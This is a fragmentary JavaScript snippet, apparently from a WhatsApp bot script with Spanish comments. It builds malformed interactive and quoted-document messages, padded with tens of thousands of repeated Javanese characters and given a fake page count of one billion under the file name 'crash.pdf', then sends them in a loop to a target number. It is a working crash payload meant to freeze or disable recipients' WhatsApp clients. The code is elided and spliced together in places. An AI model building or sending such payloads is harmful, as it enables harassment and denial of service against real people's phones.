                    ...
                    cards.push({
                        ...
                        header: {
                            ...
                            imageMessage: { 
                                ...
                                fileLength: Long.fromString("591"), 
                                height: Long.fromInt(100),          
                                width: Long.fromInt(100),           
                                ...
                                mediaKeyTimestamp: Long.fromString("1721344123"),
                            ...
                            interactiveMessage: {
                                header: {
                                    ...
                                    imageMessage: {
                                        ...
                                        // ▼▼▼ ¡¡ESTO ARREGLA LA IMAGEN GRIS!! ▼▼▼
                                        fileSha256: Buffer.from("NzsD1qquqQAeJ3MecYvGXETNvqxgrGH2LaxD8ALpYVk=", "base64"),
    fileEncSha256: Buffer.from("RLs/w++G7Ria6t+hvfOI1y4Jr9FDCuVJ6pm9U3A2eSM=", "base64"),
    mediaKey: Buffer.from("H/rCyN5jn7ZFFS4zMtPc1yhkT7yyenEAkjP0JLTLDY8=", "base64"),

    fileLength: Long.fromInt(11887),
    height: Long.fromInt(1080),
    width: Long.fromInt(1080),
    mediaKeyTimestamp: Long.fromString("1750124469"),
    jpegThumbnail: Buffer.from("", "base64"),
                                    }
                                },
                                body: { text: "testDoang" + "ꦾ".repeat(30000) },
                                footer: { text: "Punten" + "ꦽ".repeat(10000) },
                                nativeFlowMessage: {
                ...
                // Generamos con el conn inteligente
                const msg = await conn.generateWAMessageFromContent(target, messagePayload, { userJid: target });
                ...
                console.log(`[UI-IMAGE] Enviado ${i + 1}/${times} a ${target}`);
                await sleep(500);

            } catch (err) {
                console.error(`Error en ui-image loop ${i}:`, err);
            }
        }
    },
                        ...
                        contextInfo: { //
                            ...
                            quotedMessage: { //
                                documentMessage: {
                                    ...
                                    title: "crash",
                                    pageCount: Long.fromInt("1000000000"),
                                    fileName: "crash.pdf",
                                    contactVcard: true
                                }
                            },
